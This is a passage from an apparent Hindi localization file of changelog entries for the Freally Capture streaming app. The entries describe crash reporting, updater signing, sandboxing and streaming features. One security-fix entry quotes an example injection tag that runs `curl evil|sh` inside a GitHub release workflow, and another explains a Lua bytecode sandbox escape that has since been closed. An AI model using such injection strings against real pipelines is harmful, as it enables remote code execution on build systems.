बैज, डाउनलोड प्रोग्रेस-बार के ट्रैक, स्थिति चिप, स्टैट्स डॉक का &quot;समाप्त&quot; बिंदु, और EULA ब्लॉककोट की रेखा। <code>npm run theme:lint</code> अब किसी भी ऐसी white-alpha यूटिलिटी पर CI को विफल कर देता है जिसका न कोई हल्का override है और न allow-list में कोई प्रविष्टि जो बताए कि वह सफ़ेद क्यों रह सकती है।","changelog.b78b64a1e1a5":"<strong>एक्सेंट रंग चुनने पर अब हल्की थीम वाला उपयोगकर्ता अँधेरे में नहीं पहुँचता।</strong> स्वॉच थीम को ज़बरदस्ती कस्टम पर कर देता था ताकि वह किसी भी मोड से &quot;काम करे&quot;, लेकिन कस्टम डार्क-आधारित है — रंग को ज़रा सा बदलते ही हल्की थीम चुपचाप हट जाती थी। अब कस्टम के बाहर स्वॉच निष्क्रिय रहता है।","changelog.7d0190596194":"<strong>स्क्रीन रीडर अब हर री-कनेक्ट पर फ़्रेम छूटने की बौछार की घोषणा नहीं करते।</strong> छूटे फ़्रेमों की गिनती संचयी होती है और आउटेज के दौरान बढ़ती रहती है, इसलिए ऑन एयर लौटने पर पहली स्थिति-जाँच आउटेज से पहले की आधार-रेखा से तुलना करती थी और पूरे आउटेज को एक नई बौछार के रूप में घोषित कर देती थी — उन &quot;फिर से जुड़ रहा है&quot; और &quot;लाइव&quot; घोषणाओं के ऊपर, जो सुनने वाला पहले ही सुन चुका था।","changelog.a83950358bea":"<strong>सेटिंग्स सहेजना विफल होने पर अब कोई असंबंधित सेटिंग नहीं मिटती।</strong> रोलबैक पूरी सेटिंग्स का वह स्नैपशॉट बहाल कर देता था जो डायलॉग रेंडर होते समय लिया गया था, इसलिए विफल सहेजना किसी ऐसी <em>दूसरी</em> सेटिंग को भी पलट सकता था जो इस बीच सफलतापूर्वक सहेजी जा चुकी थी। अब इसके बजाय store फिर से पढ़ा जाता है।","changelog.aac84f9f1108":"<strong><code>.frec</code> रिकॉर्डिंग का अब Explorer में अपना आइकन है।</strong> Tauri के <code>fileAssociations</code> स्कीमा में कोई <code>icon</code> फ़ील्ड नहीं है और उसका NSIS टेम्पलेट एसोसिएशन के <code>DefaultIcon</code> को ऐप executable पर ही तय कर देता है, इसलिए हर रिकॉर्डिंग स्टूडियो का आइकन दिखाती थी, जबकि <code>icons/frec.ico</code> इंस्टॉल डायरेक्टरी में बेकार पड़ा रहता था। एक <code>NSIS_HOOK_POSTINSTALL</code> हुक एसोसिएशन लिखे जाने के बाद ProgId के <code>DefaultIcon</code> को फिर से लिखता है, और <code>SHCNE_ASSOCCHANGED</code> का संकेत देता है ताकि Explorer साइन-आउट के बिना ही आइकन फिर से बना ले। <em>(Windows; macOS का <code>.icns</code> और MSI बंडल अब भी ऐप आइकन दिखाते हैं — ये अलग अगले काम हैं।)</em> ध्यान दें कि एसोसिएशन <strong>इंस्टॉलर</strong> पंजीकृत करता है, इसलिए जब तक Freally Capture को बिल्ड डायरेक्टरी से चलाने के बजाय इंस्टॉल नहीं किया जाता, <code>.frec</code> सामान्य आइकन दिखाती है।","changelog.64cdb0e5fc96":"[0.95.1] — 2026-07-09 (क्रैश रिपोर्टिंग, EULA स्वीकृति का बना रहना और डायलॉग सुधार)","changelog.ec29332c27cd":"असली हार्डवेयर पर बग-रिपोर्ट फ़्लो का अभ्यास करते समय मिली छह गड़बड़ियाँ — जिनमें से दो 1.0.0 में शिप हो जातीं — साथ में वह क्रैश-रिपोर्टिंग और अपडेटर का काम जिसकी इन अभ्यासों ने माँग की। अब क्रैश होने पर ऐप आपको बताता है कि क्रैश हुआ, और रिपोर्ट पहले से खुली रखकर स्टूडियो वापस ले आता है।","changelog.a70a547d08ad":"<strong>अब क्रैश होने पर ऐप आपको बताता है, और स्टूडियो वापस ले आता है।</strong> बंद होता ऐप अपनी त्रुटि विंडो ख़ुद नहीं दिखा सकता, इसलिए panic हुक उसी executable को एक छोटे, Tauri-मुक्त हेल्पर (<code>--crash-notice &lt;pid&gt;</code>) के रूप में शुरू करता है, जो एक नेटिव &quot;Freally Capture अनपेक्षित रूप से बंद हो गया&quot; डायलॉग दिखाता है, क्रैश हुए प्रोसेस के प्रोसेस तालिका से हटने का इंतज़ार करता है, और ऐप फिर से लॉन्च करता है। फिर से खुला स्टूडियो साफ़ की गई रिपोर्ट अपने-आप दिखाता है। यह इंतज़ार बेहद ज़रूरी है: जब मृत प्रोसेस अब भी single-instance लॉक पकड़े हो, तब फिर से लॉन्च करने पर नया लॉन्च बंद होते ऐप में ही समा जाता है और कोई स्टूडियो बचता ही नहीं।","changelog.71da0a3520ee":"<strong>EULA स्वीकार करना अब अपने-आप रद्द नहीं होता।</strong> <code>App.tsx</code> माउंट होते समय सेटिंग्स <em>और</em> EULA की स्थिति पढ़ता है, इसलिए सेटिंग्स का स्नैपशॉट स्वीकृति से पहले का होता है; उसी सत्र में कोई भी सेटिंग बदलने पर पुराना <code>acceptedEulaVersion: null</code> उसके ऊपर फिर से लिख दिया जाता था और अगली बार लॉन्च पर गेट लौट आता था। स्वीकृति से पहले सहेजी गई प्रोफ़ाइल भी यही करती थी। अब <code>SettingsStore::set()</code> इस फ़ील्ड को बनाए रखता है और सिर्फ़ <code>accept_eula()</code> ही इसे लिखता है।","changelog.327bad332e86":"<strong>डायलॉग अपने डॉक के भीतर फँसे हुए थे।</strong> <code>Panel</code> का <code>backdrop-blur</code> उसे <code>position: fixed</code> के लिए containing block बना देता है, इसलिए <code>PickerShell</code> का ओवरले ख़ुद को विंडो के बजाय डॉक के बॉक्स के भीतर बीच में रखता था — 19 में से 16 डायलॉग, <em>अपडेट जाँचें</em> समेत, आंशिक रूप से स्क्रीन से बाहर रेंडर होते थे और उनके बटन तक पहुँचा नहीं जा सकता था। अब <code>PickerShell</code> <code>document.body</code> में portal करता है।","changelog.05a8d823f564":"<strong>ईमेल से भेजी जाने वाली क्रैश रिपोर्ट चुपचाप कुछ नहीं खोलती थीं।</strong> URL की लंबाई अक्षरों की गिनती से सीमित थी, लेकिन percent-encoding 3-बाइट वाले अक्षर को नौ गुना बढ़ा देती है — एक असली backtrace से ~7800 अक्षरों वाला <code>mailto:</code> बना, जो Windows ShellExecute की ~2048 की सीमा से आगे था, और ऐसी स्थिति में एक ख़ाली विंडो खुलती है और कोई त्रुटि नहीं बताई जाती। अब सीमा <strong>पूरे URL</strong> पर है (scheme, पता, विषय और मुख्य भाग एक साथ), जो एनकोड की गई लंबाई पर लागू होती है, और काट-छाँट कभी किसी escape को बीच से नहीं तोड़ती। सिर्फ़ मुख्य भाग को सीमित करना काफ़ी नहीं था: विषय उपयोगकर्ता का टेक्स्ट है, और 80 CJK अक्षर 720 बाइट में एनकोड होते हैं, इसलिए गैर-अंग्रेज़ी रिपोर्ट फिर भी ~2285 अक्षरों तक पहुँच जाती थी।","changelog.b0d9792ddddb":"<strong>एक साथ हुए दो panic दो क्रैश डायलॉग दिखाते थे।</strong> <code>panic = &quot;abort&quot;</code> दुनिया को तुरंत नहीं रोकता, इसलिए दो थ्रेड, दोनों हुक चला सकते थे। अब हर प्रोसेस में सूचना ज़्यादा से ज़्यादा एक बार शुरू होती है।","changelog.6747e7604c73":"<strong>जिस क्रैश-सूचना हेल्पर को पढ़ने योग्य pid नहीं मिलता था, वह तुरंत फिर से लॉन्च कर देता था</strong>, सीधे उसी single-instance होड़ में, जिससे बचने के लिए वह बना है। अब इसके बजाय वह एक तय अंतराल तक इंतज़ार करता है।","changelog.c52ec7fca94b":"<strong>ड्रॉपडाउन मेन्यू बाहर क्लिक करने पर भी खुले रहते थे।</strong> सोर्स रेल का <strong>+</strong> मेन्यू और दोनों <em>फ़िल्टर जोड़ें</em> मेन्यू अब बाहर क्लिक करने या Escape दबाने पर बंद हो जाते हैं। Escape सिर्फ़ सबसे भीतरी चीज़ बंद करता है, इसलिए किसी डायलॉग के भीतर का मेन्यू एक बार दबाने पर बंद होता है और दूसरी बार दबाने पर डायलॉग।","changelog.ceb3ac683c32":"<strong>Gmail में लिखें</strong>, मौजूदा मेल-क्लाइंट बटन के साथ — सादा https, कोई API कुंजी नहीं, अपने-आप कुछ नहीं भेजा जाता; साइन-आउट उपयोगकर्ता को Google की लॉगिन स्क्रीन दिखती है और फिर वह पहले से भरे ड्राफ़्ट पर लौट आता है।","changelog.3ed3900cea6b":"<strong>क्रैश रिपोर्ट में यह दर्ज होता है कि क्रैश कब हुआ</strong>, उपयोगकर्ता की लोकल घड़ी में उसके UTC ऑफ़सेट के साथ, और UTC में भी। ऑफ़सेट से पहचान का हल्का संकेत मिलता है और इसे रिपोर्ट के &quot;कोई व्यक्तिगत पहचानकर्ता नहीं&quot; नियम के एकमात्र जान-बूझकर रखे गए अपवाद के रूप में दर्ज किया गया है; उपयोगकर्ता भेजने से पहले ठीक-ठीक टेक्स्ट पढ़ता है।","changelog.2757df14a536":"<strong>स्टूडियो लॉन्च पर एक बार अपडेट जाँचता है</strong> और नया संस्करण, उसकी संख्या और इस फ़ाइल के रिलीज़ नोट्स एक सिर्फ़-पढ़ने वाले फ़ील्ड में दिखाता है, स्पष्ट हाँ/नहीं के साथ। लंबित क्रैश रिपोर्ट को डायलॉग की जगह हमेशा पहले मिलती है; अपडेट अगले लॉन्च का इंतज़ार करता है। ऑफ़लाइन या दर-सीमित जाँचें चुप रहती हैं। <code>latest.json</code> अब संस्करण के <code>CHANGELOG.md</code> वाले हिस्से को अपने <code>notes</code> के रूप में रखता है।","changelog.0ceef8bf9dbd":"Windows अपडेट अब चुपचाप फिर से शुरू होने के बजाय NSIS विज़ार्ड (<code>installMode: basicUi</code>) चलाते हैं, ताकि आख़िरी पेज पर <strong>Freally Capture चलाएँ</strong> और डेस्कटॉप-शॉर्टकट का एक चेकबॉक्स मिले। इंस्टॉलर में भी अब NSIS के डिफ़ॉल्ट आइकन के बजाय ऐप का आइकन (<code>nsis.installerIcon</code>) है।","changelog.04d1725214c0":"बग-रिपोर्ट डायलॉग का <strong>परीक्षण</strong> खंड (<em>क्रैश रिपोर्ट का अनुकरण करें</em>, <em>परीक्षण के लिए क्रैश करें</em>) और उसके दो IPC कमांड। &quot;ऐप को क्रैश करें&quot; जैसे नियंत्रण का किसी लाइव स्टूडियो में शिप होने का कोई काम नहीं; इस लूप का अभ्यास <code>--test-crash</code> लॉन्च फ़्लैग से किया जाता है, जिसके पीछे न कोई बटन है और न कोई कमांड।","changelog.6bd81d475bf0":"<strong>रिलीज़ वर्कफ़्लो: टैग नाम के ज़रिए shell injection।</strong> <code>${{ github.ref_name }}</code> सीधे <code>run:</code> ब्लॉक में डाला जाता था, इसलिए bash के पार्स करने से पहले ही GitHub टैग को shell के <em>सोर्स</em> में जोड़ देता था। Ref नामों में स्पेस वर्जित हैं, लेकिन <code>&quot;</code>, <code>;</code>, <code>$</code> और backtick की अनुमति है, और <code>${IFS}</code> स्पेस की कमी पूरी कर देता है — <code>v1&quot;;curl${IFS}evil|sh;&quot;</code> जैसा टैग चल जाता। अब टैग स्क्रिप्ट तक <code>env:</code> के ज़रिए, डेटा के रूप में पहुँचता है। इसका फ़ायदा उठाने के लिए टैग push करने की पहुँच चाहिए थी, इसलिए यह गहराई में सुरक्षा (defence in depth) का उपाय है।","changelog.81cccf7322b4":"रिलीज़ जॉब का <code>actions/checkout</code> अब <code>persist-credentials: false</code> सेट करता है। उसके पास <code>contents: write</code> है और वह सिर्फ़ <code>CHANGELOG.md</code> पढ़ता है; <code>GITHUB_TOKEN</code> को <code>.git/config</code> में छोड़ देने से भविष्य के किसी भी injection को push करने का तैयार रास्ता मिल जाता।","changelog.25ca7c7f85dd":"<code>PRIVACY.md</code> अब साफ़ बताता है कि अपडेट जाँच सिर्फ़ माँगने पर नहीं, बल्कि <strong>हर लॉन्च पर एक बार</strong> चलती है, और यह उपयोगकर्ता के बारे में कुछ नहीं भेजती — पहले के शब्दों में कहा गया था कि हर नेटवर्क अनुरोध &quot;आपकी किसी क्रिया से शुरू होता है&quot;, जिसे नई स्टार्टअप जाँच ने असत्य बना दिया था।","changelog.46a767ffc1f9":"[0.95.0] — 2026-07-08 (गेम कैप्चर, वितरण और हर ऐप का ऑडियो — चरण 8)","changelog.599aa55a76f0":"साइन किया हुआ, स्व-होस्टेड ऑटो-अपडेट, हर ऐप्लिकेशन का ऑडियो कैप्चर, एक NDI रनटाइम सीम, एक गेम-कैप्चर सीम जो anti-cheat जोखिम को ईमानदारी से चिह्नित करता है, पहली बार चलने पर EULA गेट, और रिएक्शन/समीक्षा के लिए स्ट्रीम में वीडियो — चरण 8 की &quot;1.0.0 की ओर&quot; सतह, सब लोकल और डिफ़ॉल्ट रूप से बंद।","changelog.5903d686ccbb":"जोड़ा गया — चरण 8","changelog.eb682bb7ec7d":"<strong>साइन किया हुआ, स्व-होस्टेड ऑटो-अपडेटर</strong> (TASK-803) — ऐप GitHub releases एंडपॉइंट पर एक साइन की हुई <code>latest.json</code> जाँचता है और हर डाउनलोड को लागू करने से पहले बाइनरी में शामिल एक minisign सार्वजनिक कुंजी से सत्यापित करता है (बिना साइन किया या छेड़छाड़ किया गया पैकेज अस्वीकार कर दिया जाता है)। नियंत्रण डॉक में <strong>⭳ अपडेट जाँचें…</strong> — बिना क्लिक के कुछ भी डाउनलोड नहीं होता; अपडेट पूरा करने के लिए ऐप फिर से शुरू होता है। रिलीज़ पाइपलाइन हर artifact को साइन करती है और <code>latest.json</code> बनाती है; macOS Developer-ID + notarization जुड़ा हुआ है और secrets पर निर्भर है (सशुल्क प्रमाणपत्र पर अपग्रेड, वर्कफ़्लो में कोई बदलाव नहीं)। <code>design/updater-signing.md</code> देखें।","changelog.883b1ffbdb75":"<strong>हर ऐप्लिकेशन का ऑडियो कैप्चर</strong> (TASK-805) — किसी एक ऐप का ऑडियो उसके अपने मिक्सर सोर्स के रूप में कैप्चर करें। पहले Windows पर, WASAPI <strong>process loopback</strong> के ज़रिए (process-loopback वर्चुअल डिवाइस पर <code>ActivateAudioInterfaceAsync</code>, Win10 2004+); COM वाला <code>unsafe</code> नए <code>fcap-appaudio</code> क्रेट में अलग रखा गया है ताकि <code>fcap-audio</code> <code>#![forbid(unsafe_code)]</code> बना रहे। इसे पूरी मिक्सर स्ट्रिप मिलती है (VU, फ़ेडर, म्यूट, मॉनिटरिंग, फ़िल्टर, ट्रैक)। Linux/macOS हर OS के लिए ईमानदार मार्गदर्शन दिखाते हैं। सोर्स ▸ <strong>ऐप्लिकेशन ऑडियो</strong>।","changelog.56b6b2b908a6":"<strong>गेम कैप्चर सीम + anti-cheat/AV का ईमानदार चिह्नांकन</strong> (TASK-801) — &quot;गेम कैप्चर&quot; (एक DX/GL/Vulkan हुक इंजेक्ट करना) एक ऑप्ट-इन, <strong>चिह्नित माइलस्टोन</strong> है: ऐप कभी चुपचाप इंजेक्ट नहीं करता और किसी भी हुक से पहले anti-cheat के <strong>बैन जोखिम</strong> + AV जोखिम को सामने रखता है। आज काम करने वाला रास्ता — <strong>विंडो कैप्चर</strong> (बिना बॉर्डर/विंडो मोड) — हर OS के लिए सुझाया जाता है (Wayland → portal)। सोर्स ▸ <strong>गेम कैप्चर (पहले पढ़ें)</strong>।","changelog.ec03a805ba49":"<strong>NDI रनटाइम सीम</strong> (TASK-804) — वैकल्पिक NDI आउटपुट, दस्तावेज़ में बताए गए env vars + डिफ़ॉल्ट डायरेक्टरी के ज़रिए उपयोगकर्ता द्वारा इंस्टॉल किया गया NDI रनटाइम (कभी बंडल नहीं) पहचानता है और उसे link-probe करता है; टाइप किया गया आउटपुट फ़्लैग इसी पहचान पर निर्भर है। फ़्रेम भेजना मुफ़्त NDI SDK हेडर से जुड़ता है (नामित अगला काम)। कंपोनेंट ▸ <strong>वैकल्पिक इंटीग्रेशन</strong> में सिर्फ़-पढ़ने के रूप में दिखता है।","changelog.eaa0871281d1":"<strong>पहली बार चलने पर EULA स्वीकृति गेट</strong> — जब तक मौजूदा EULA संस्करण स्वीकार नहीं किया जाता, स्टूडियो रेंडर नहीं होता (स्क्रॉल करके पढ़ें, फिर <strong>मैं सहमत हूँ</strong> / <strong>अस्वीकार करें और बाहर निकलें</strong>); स्वीकृति सहेजी जाती है और सिर्फ़ EULA संस्करण बदलने पर ही फिर से पूछा जाता है। <code>EULA.md</code> बिल्ड के समय एम्बेड की जाती है, ताकि स्वीकार किया गया टेक्स्ट ठीक वही हो जो शिप होता है।","changelog.52426b69775a":"<strong>स्ट्रीम में वीडियो (रिएक्शन/समीक्षा)</strong> — सीन में एक वीडियो एम्बेड करें और उस पर बोलते हुए उसे <strong>लाइव रोकें/फिर से शुरू करें</strong>, फिर हटा दें — मीडिया सोर्स का ऑडियो तस्वीर के साथ मिक्स में रुकता और फिर से चलता है (मीडिया सोर्स पर ⏸/▶)।","changelog.082d1c8d5bec":"<strong>ऐप के भीतर कंपोनेंट डाउनलोड</strong> — ज़रूरत पड़ने पर होने वाला ffmpeg डाउनलोड अब अपने प्रोग्रेस बार + रद्द करें के बगल में <code>98.35%</code> जैसा स्पष्ट प्रतिशत दिखाता है। एक नया <strong>ब्राउज़र सोर्स रनटाइम (Chromium/CEF)</strong> कंपोनेंट ~100 MB का CEF रनटाइम उसी ईमानदार तरीके से डाउनलोड करता है: यह आधिकारिक CEF बिल्ड इंडेक्स से सबसे नया स्थिर बिल्ड ढूँढता है, <strong>अनपैक करने से पहले डाउनलोड को उसी इंडेक्स के SHA-1 से सत्यापित करता है</strong> (न बंडल, न हार्डकोड किया गया हैश), और उसे हर उपयोगकर्ता के लिए कैश करता है — उसी %/बार/रद्द करें वाले UI के साथ। रनटाइम के ज़रिए रेंडर होने वाला ब्राउज़र <em>सोर्स</em> अपना अलग अगला माइलस्टोन है; यह रिलीज़ रनटाइम का डाउनलोड शिप करती है।","changelog.1dc8ae2f6900":"ईमानदारी से तय किया गया दायरा (चरण 8)","changelog.158788627266":"<strong>VST2/3</strong> (TASK-804) — एक फ़्लैग के पीछे टाला गया: Steinberg अब VST2 SDK का लाइसेंस नहीं देता और VST3 GPLv3-या-प्रोप्राइटरी है, और दोनों $0/बिना-अतिरिक्त-लाइसेंस वाले बिल्ड से टकराते हैं। ऐप का अपना DSP फ़िल्टर समूह (डीनॉइज़, गेट, कंप्रेसर, लिमिटर, EQ, गेन, डकिंग) शिप किया गया विकल्प है।","changelog.c436d24d7e3a":"<strong>गेम-कैप्चर GPU-हुक इंजेक्शन</strong> और <strong>NDI फ़्रेम भेजना</strong> वे नामित अगले माइलस्टोन हैं, जिनके लिए ऊपर के सीम स्थिर हैं।","changelog.8843550dc6eb":"[0.90.0] — 2026-07-08 (रिमोट कंट्रोल, स्क्रिप्टिंग और प्लगइन — विस्तार की सतह)","changelog.a7f6a66abff0":"Stream Deck से स्टूडियो चलाएँ, लाइव जाने पर स्क्रिप्ट से प्रतिक्रिया दें, एक चैट डॉक एम्बेड करें, और प्लगइन से ऐप का विस्तार करें — चरण 7 की विस्तार सतह, सब <strong>लोकल और डिफ़ॉल्ट रूप से बंद</strong>।","changelog.3f14c1391b04":"जोड़ा गया — विस्तार (चरण 7)","changelog.cc7d3cbcb365":"<strong>WebSocket रिमोट-कंट्रोल API</strong> (TASK-701) — पासवर्ड से सुरक्षित एक WebSocket, जिससे Stream Deck / Companion जैसा कंट्रोलर जुड़ता है: सीन बदलें, ट्रांज़िशन चलाएँ, स्ट्रीम और रिकॉर्डिंग शुरू/बंद करें, रीप्ले सहेजें, म्यूट/वॉल्यूम सेट करें — UI वाली ही क्रियाएँ, उससे ज़्यादा कुछ नहीं (यह फ़ाइलें नहीं पढ़ सकता)। <strong>डिफ़ॉल्ट रूप से बंद</strong>; जब तक LAN को स्पष्ट रूप से चालू न किया जाए, <code>127.0.0.1</code> पर bind होता है; बंद होने का मतलब है कि पोर्ट बंद है। प्रमाणीकरण challenge–response है — पासवर्ड कभी नेटवर्क पर नहीं जाता। सेटिंग्स → नियंत्रण → <strong>⌁ रिमोट…</strong>।","changelog.155aa02952b7":"<strong>ब्राउज़र डॉक</strong> (TASK-702) — चैट पॉपआउट, अलर्ट पेज या Companion वेब बटन को स्टूडियो के बगल में उनकी अपनी विंडो के रूप में खोलें (सिर्फ़ http/https; डॉक की ऐप तक कोई पहुँच नहीं है, वह बस रेंडर करता है)। नियंत्रण → <strong>⧉ डॉक…</strong>।","changelog.3149da08891b":"<strong>Sandbox वाली Lua स्क्रिप्टिंग</strong> (TASK-703) — <code>.lua</code> स्क्रिप्ट जो स्टूडियो की घटनाओं (लाइव जाना, सीन बदलना, रिकॉर्डिंग की स्थिति) पर प्रतिक्रिया देती हैं और वही कमांड सतह चलाती हैं जो रिमोट API चलाता है। sandbox की <strong>फ़ाइलों या OS तक कोई पहुँच नहीं</strong> है (न <code>io</code>/<code>os</code>/<code>require</code>, और bytecode लोडर बंद हैं); स्क्रिप्ट की त्रुटि वहीं सीमित रहती है। <code>scripts/sample.lua</code> API दिखाती है। नियंत्रण → <strong>⚡ स्क्रिप्ट…</strong>।","changelog.507908bbd502":"<strong>प्लगइन SDK</strong> (TASK-704) — दस्तावेज़ीकृत <code>Source</code>/<code>Filter</code> अनुबंध + एक रजिस्ट्री सीम, ताकि कोई प्लगइन क्रेट <strong>कोर को छुए बिना</strong> सोर्स या फ़िल्टर जोड़ सके। <code>plugins/checkerboard</code> पूरा नमूना है; <code>design/plugin-sdk.md</code> मार्गदर्शिका है।","changelog.5c03c1a47d1d":"<strong>फ़ोन वाले मेहमानों के लिए वेब जॉइन पेज</strong> (TASK-R3) — आमंत्रण QR अब Pages साइट पर <code>docs/join.html</code> खोलता है: रिमोट-मेहमान सत्र का मेहमान वाला हिस्सा, एक सामान्य ब्राउज़र में चलता हुआ (कैमरा + माइक, स्पष्ट क्लिक से जुड़ना, दो-गेट मॉडल के तहत ख़ुद को म्यूट करना, होस्ट टॉकबैक + होस्ट व्यू, जहाँ ब्राउज़र समर्थन करे वहाँ स्क्रीन शेयर, backoff के साथ अपने-आप फिर से जुड़ना) — न कोई इंस्टॉल, न कोई CDN (PeerJS vendored)। कॉपी किया जा सकने वाला <code>freally://</code> लिंक अब भी सीधे ऐप खोलता है।","changelog.41ecc350d86a":"<strong>नेटिव प्रीव्यू (Windows)</strong> — रेंडर थ्रेड का पहला सरफ़ेस बिल्ड अब ओवरले लॉक के तहत UI-थ्रेड के DirectComposition commits के साथ क्रमबद्ध है (जब कोई रीसाइज़ ठीक उसी समय हो जब सरफ़ेस बन रहा हो, तब ख़ाली प्रीव्यू की एक संकरी होड़ थी), और नेटिव चयन बॉक्स अब हाथ से लिखी कॉपी के बजाय कंपोज़िटर का अपना crop chain-size fold दोबारा इस्तेमाल करता है (TASK-NP7)।","changelog.e2d476fc460a":"<strong>विंडो कैप्चर</strong> — कर्सर पंप अब तब बिना बने ~60 fps फ़्रेम नहीं बनाता जब कर्सर किसी ऐसी जगह चल रहा हो जो कैप्चर की गई विंडो के ऊपर <em>नहीं</em> है (कोई दूसरी विंडो उसे ढक रही हो, या डेस्कटॉप पर कहीं और)। यह नए हर-परीक्षण-एक-प्रोसेस वाले लाइव हार्नेस (<code>scripts/live-capture-tests.ps1</code>, TASK-NP9) से पकड़ा गया, जो WinRT/D3D teardown की उस होड़ से भी बचाता है जो कई परीक्षणों वाले लाइव रन को क्रैश कर सकती थी।","changelog.d574645cb05e":"<strong>चार्टर दस्तावेज़</strong> — README / PRIVACY / SECURITY अब ऑप्ट-इन रिमोट-मेहमान P2P नेटवर्क सतह का ईमानदारी से वर्णन करते हैं (समय-सीमा वाले आमंत्रण, स्पष्ट क्लिक से जुड़ना, P2P DTLS-SRTP मीडिया, ब्रोकर सिर्फ़ हैंडशेक ले जाता है, वैकल्पिक उपयोगकर्ता-स्वामित्व वाला TURN, मॉडरेशन + बैन के नियम), और <code>THIRD-PARTY-NOTICES.md</code> में गायब PeerJS + qrcode-generator प्रविष्टियाँ जोड़ी गईं।","changelog.c173f50767b2":"<strong>Lua sandbox को मज़बूत किया गया</strong> — स्क्रिप्टिंग sandbox अब सिर्फ़ <code>dofile</code>/<code>loadfile</code> ही नहीं, बल्कि बेस-लाइब्रेरी के <code>load</code>/<code>loadstring</code> और <code>string.dump</code> को भी बंद करता है। Lua 5.4 का <code>load</code> डिफ़ॉल्ट रूप से <strong>बाइनरी bytecode</strong> स्वीकार करता है, जिसका लोडर सत्यापित नहीं है — एक गढ़ा हुआ bytecode टुकड़ा नेटिव-कोड VM से बाहर निकलने का रास्ता है, जो no-io/no-os sandbox को पूरी तरह बायपास कर देता। रिलीज़ से पहले इस चरण की सुरक्षा समीक्षा में पकड़ा गया; एक रिग्रेशन परीक्षण पुष्टि करता है कि तीनों हट चुके हैं।","changelog.1ebe7221d5d2":"[0.85.0] — 2026-07-07 (स्ट्रीमिंग की गहराई: मल्टीस्ट्रीम / SRT / WHIP + सीन/सोर्स/एनकोडर की गहराई)","changelog.2d315220f41f":"<strong>जादुई पल</strong> — एक साथ Twitch <strong>और</strong> YouTube पर लाइव जाएँ, साथ में एक अलग लोकल कॉपी रिकॉर्ड करते हुए और 30 सेकंड का रीप्ले सहेजते हुए, 9:16 वर्टिकल आउटपुट, नेस्टेड सीन, और एक लाइव चैट ओवरले के साथ जिसके लिए <strong>कभी भी कोई API कुंजी या साइन-इन नहीं चाहिए</strong>।","changelog.feb4e52158c8":"जोड़ा गया — स्ट्रीमिंग की गहराई","changelog.75834546387e":"<strong>एक साथ मल्टीस्ट्रीम</strong> (TASK-601) — एक साथ कई लक्ष्यों पर लाइव जाएँ, <strong>हर प्लेटफ़ॉर्म पर सीधे</strong> (कोई restream सर्वर नहीं)। जिन लक्ष्यों की एनकोड सेटिंग्स मेल खाती हैं, वे <strong>एक ही हार्डवेयर एनकोड साझा करते हैं</strong> (ffmpeg के <code>tee</code> से बाँटा जाता है); अलग सेटिंग्स अलग-अलग एनकोड होती हैं। विफल लक्ष्य को उसकी अपनी, फिर से जुड़ने वाली लेन में अलग कर दिया जाता है, ताकि वह किसी स्वस्थ लक्ष्य को कभी नीचे न खींच सके; स्टैट्स डॉक हर लक्ष्य का स्वास्थ्य + बिटरेट अलग-अलग दिखाता है।","changelog.d7881741d3bc":"<strong>SRT और WHIP</strong> (TASK-602) — RTMP/RTMPS के साथ-साथ स्व-होस्टेड SRT इनजेस्ट या WebRTC WHIP एंडपॉइंट पर स्ट्रीम करें, री-कनेक्ट + स्वास्थ्य के साथ। लाइव जाएँ पर इंस्टॉल किए गए ffmpeg के SRT/WHIP समर्थन की ईमानदारी से जाँच होती है। WHIP स्ट्रीम कुंजियाँ <code>Authorization</code> हेडर में जाती हैं, URL में कभी नहीं।","changelog.01e2ed129c31":"<strong>लगातार चलने वाला रीप्ले बफ़र</strong> (TASK-603) — सक्रिय रहते हुए, बैकग्राउंड में चलने वाला एक एनकोड आख़िरी N सेकंड को डिस्क पर छोटे खंडों के रूप में रखता है (सीमित मेमोरी + डिस्क); एक ग्लोबल हॉटकी उन्हें <strong>स्ट्रीम या रिकॉर्डिंग को बाधित किए बिना</strong> एक चलने योग्य फ़ाइल में सहेजती है, लंबाई + गुणवत्ता प्रीसेट के साथ।","changelog.8abd1a3e56cd":"<strong>वर्टिकल / मल्टी-कैनवस</strong> (TASK-604) — एक दूसरा कैनवस (जैसे 9:16), जो किसी भी सीन से अपने आकार में बनाया जाता है, और मुख्य कैनवस से <strong>स्वतंत्र रूप से रिकॉर्ड और स्ट्रीम किया जा सकता है</strong>; एक लाइव प्रीव्यू और उसका अपना fps आँकड़ा।","changelog.2c69be261f19":"जोड़ा गया — सीन / सोर्स / फ़िल्टर / एनकोडर की गहराई","changelog.be269b309b79":"<strong>नेस्टेड सीन, सोर्स समूह और हर सीन का ऑडियो</strong> (TASK-605) — किसी दूसरे सीन के भीतर सोर्स के रूप में रखा गया सीन (चक्र से सुरक्षित); ऐसे समूह जो एक साथ खिसकते/दिखते/छिपते हैं; हर सीन के लिए एक मिक्सर override, ताकि कोई सीन ग्लोबल मिक्स से अलग सुनाई दे सके।","changelog.5c7ab998f7ed":"<strong>ट्रांज़िशन पैक</strong> (TASK-606) — एक <strong>स्टिंगर</strong> (कट के ऊपर एक वीडियो), एक <strong>कस्टम luma-wipe इमेज</strong>, और कई और बिल्ट-इन वाइप पैटर्न (क्षैतिज / डायमंड / घड़ी)।","changelog.4d324b472fe3":"<strong>इमेज स्लाइडशो सोर्स + कैप्चर-कार्ड प्रीसेट</strong> (TASK-607) — टाइमर पर बारी-बारी से चलने वाला इमेजों का क्रमबद्ध समूह, वैकल्पिक क्रॉसफ़ेड, लूप/आख़िरी पर रुके रहना और शफ़ल के साथ; वीडियो-डिवाइस पिकर में Elgato/AVerMedia के आम फ़ॉर्मैट प्रीसेट (सिर्फ़ वही मोड जो कार्ड सचमुच बताता है)।","changelog.67f18114a372":"<strong>कलर-की / luma-की + रेंडर-डिले फ़िल्टर</strong> (TASK-608) — RGB दूरी से कोई भी रंग हटाएँ (हरे के अलावा दूसरी पृष्ठभूमियाँ), चमक के आधार पर की करें, और किसी सोर्स के वीडियो को ऑडियो से मिलाने के लिए N ms की देरी दें।","changelog.8349cff49176":"<strong>एनकोडर की गहराई</strong> (TASK-609) — हर wire एनकोड पर <strong>Rec.709</strong> रंग तय (अब फीके/ खिसके HD रंग नहीं), एक वैकल्पिक <strong>आउटपुट डाउनस्केल</strong> (कैनवस से अलग रिज़ॉल्यूशन पर रिकॉर्ड/स्ट्रीम करें — हर स्ट्रीम लक्ष्य के लिए अलग), और ऊँचे FPS (120/144/240) + 4K रास्ते। HDR को ईमानदारी से दायरे से बाहर दर्ज किया गया है (कैनवस 8-बिट SDR है)।","changelog.e821097e85ca":"<strong>रिकॉर्डिंग चैप्टर मार्कर</strong> (TASK-610) — एक मार्कर हॉटकी सक्रिय 